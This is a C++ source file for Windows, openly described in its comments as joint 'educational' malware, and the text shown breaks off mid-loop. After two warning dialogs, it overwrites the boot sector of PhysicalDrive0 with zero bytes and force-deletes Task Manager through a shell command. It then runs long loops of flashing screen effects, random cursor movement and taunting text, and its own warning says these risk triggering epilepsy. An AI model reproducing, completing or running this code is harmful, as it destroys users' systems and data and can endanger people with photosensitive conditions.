typedef struct IUnknown IUnknown;
#include <Windows.h>
#include <iostream>
#define MYRGB(r,g,b) (r | g << 8 | b << 16)
#define USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846
#include <WinNT.h>
#include <stdint.h>
#include <intrin.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>


/*const unsigned char MBR_Data[512] = {};
	INT
		WINAPI
		wWinMain(
			_In_	 HINSTANCE hInstance,
			_In_opt_ HINSTANCE PrevInstance,
			_In_	 PWSTR 	   szCmdLine,
			_In_	 INT       nShowCmd
		);
	{
		DWORD BytesWritten;
		HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
		CloseHandle(hMBR);
	}
Este é o código de Mbr, aonde ele invez de subscrever, e colocar alguma mensagem, vídeo ou imagem, ele apenas apaga o setor de boot!

Este é o malware de Joaozin_#4245 e do urso polar#3681
O Polar programa em C++
O Joaozin_ Programa em C++ tmb

A nossa ideia é fazer um "malware colab", tudo em C++, oque eu acho que vai ser legal :)

Este malware foi feito para questões educacionais, nada para ferrar à outra pessoa XD

Hey boy, python ainda está sendo programada pelo Polar, mais, vai demorar, então, por enquanto, temos que esperar!

eu ainda estou programando os payloads, então, BRUH! XD.
*/
using namespace std;

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	int message = MessageBox(NULL, L"Hey, this is considered malware, it will delete your boot sector, it will destroy your computer, I'm not responsible for damages to your machine, it's made for educational purposes, it's recommended to test it in a VM, who created it virus is Joaozin_#4245 and Spitzner who gave the tips, I hope you like our malware a lot. And one more alert, this malware contains flashing lights, many colors quickly, that is, if you have any vision problems like epilepsy, I suggest not running this, and downloading something less dangerous to your health", L"Warning, VIRUS DEDECTED", MB_YESNO | MB_ICONINFORMATION | MB_SYSTEMMODAL);
	switch (message)
	{
	case IDNO:
	{
		exit(0);
	}
	}
	message = MessageBox(NULL, L"This is my last warning, it will screw your boot, when you run it, it will delete your boot sector, do you really want to fuck everything up?", L"My last warning, I DON'T WANNA DESTROY YOUR PC :(", MB_YESNO | MB_ICONINFORMATION | MB_SYSTEMMODAL);
	switch (message)
	{
	case IDNO:
	{
		exit(0);
	}
	}
	const unsigned char MBR_Data[512] = {};
	INT
		WINAPI
		wWinMain(
			_In_	 HINSTANCE hInstance,
			_In_opt_ HINSTANCE PrevInstance,
			_In_	 PWSTR 	   szCmdLine,
			_In_	 INT       nShowCmd
		);
	{
		DWORD BytesWritten;
		HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
		CloseHandle(hMBR);
	}
	HDC getsa = GetDC(0);
	POINT pt;
	GetCursorPos(&pt);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HWND hwnd = GetDesktopWindow();
	HDC hdcc = GetDC(0);
	HDC hdc;
	HDC screenDC = GetDC(NULL);
	int screenWidth = GetDeviceCaps(screenDC, HORZRES);
	int screenHeight = GetDeviceCaps(screenDC, VERTRES);
	HDC DES = GetDC(0);
	hdc = GetWindowDC(GetDesktopWindow());
	LPCWSTR lptext = L"MY NAME IS MARKTOWN";
	LPCWSTR lptext2 = L"ARE YOU STILL USING YOUR PC?";
	LPCWSTR lptext3 = L"DUDE, HOW DID YOU DOWNLOAD THIS?";
	HDC desk = GetDC(0);
	desk = GetDC(0);
	int a = GetSystemMetrics(0);
	int b = GetSystemMetrics(1);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	CURSORINFO curinf;
	SetTextColor(hdc, MYRGB(rand() % 255, rand() % 255, rand() % 255));
	SetBkColor(hdc, MYRGB(rand() % 255, rand() % 255, rand() % 255));
	GetCursorPos(&pt);
	HWND wnd = GetDesktopWindow();
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	system("del /f /s /q C:\Windows\System32\Taskmgr.exe");//Deleta o gerenciador de tarefas
	system("timeout 60");
	for (float i = 0; i < x + y; i += 0.30f) {
		double rotaision = 100;
		int a = sin(rotaision) * 100;
		BitBlt(desk, i, 0, 10, y, desk, i, a, SRCINVERT);
		BitBlt(hdc, i, 0, 95, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - 15, pt.y - 15, LoadIcon(NULL, IDI_ERROR));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(10);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 10, 10, a, b, hdc, 12, 12, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(100);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 10, 10, a, b, hdc, 12, 12, SRCINVERT);
		Sleep(50);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 10, 10, a, b, hdc, 12, 12, SRCINVERT);
		Sleep(10);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 10, 10, a, b, hdc, 12, 12, SRCCOPY);
		Sleep(5);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 10, 10, a, b, hdc, 12, 12, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 12, a, b, hdc, 10, 10, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 10, 10, x, y, hdc, 12, 12, SRCCOPY);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCCOPY);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		StretchBlt(GetDC(NULL), 100, 100, a - 50, b - 50, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
	}
	for (int i = 0; i < 6000; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCCOPY);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		StretchBlt(GetDC(NULL), 100, 100, a - 50, b - 50, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		DrawIcon(hdc, rand() % pt.x - 10, pt.y - 10, LoadIcon(NULL, IDI_ERROR));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, desk, rand() % x, rand() % y, PATINVERT);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
	}
	for (int i = 0; i < 600; i++) {
		DrawIcon(hdc, rand() % pt.x - 10, pt.y - 10, LoadIcon(NULL, IDI_ERROR));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, desk, rand() % x, rand() % y, PATINVERT);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
	}
	for (int i = 0; i < 600; i++) {
		DrawIcon(hdc, rand() % pt.x - 10, pt.y - 10, LoadIcon(NULL, IDI_ERROR));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, desk, rand() % x, rand() % y, PATINVERT);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
	}
	for (int i = 0; i < 600; i++) {
		DrawIcon(hdc, rand() % pt.x - 10, pt.y - 10, LoadIcon(NULL, IDI_ERROR));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, desk, rand() % x, rand() % y, PATINVERT);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		BitBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, desk, rand() % x, rand() % y, SRCINVERT);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
	}
	for (float i = 0; i < x + y; i += 0.99f) {
		double rotaision = 10;
		GetCursorInfo(&curinf);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		int a = sin(rotaision) * 10;
		BitBlt(desk, i, 0, 1, y, desk, i, a, SRCINVERT);
		BitBlt(hdc, i, 0, 1, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
	}
	for (float i = 0; i < x + y; i += 0.99f) {
		double rotaision = 100;
		GetCursorInfo(&curinf);
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		int a = sin(rotaision) * 100;
		BitBlt(desk, i, 0, 10, y, desk, i, a, SRCINVERT);
		BitBlt(hdc, i, 0, 95, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		LineTo(desk, rand() % x, rand() % y);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
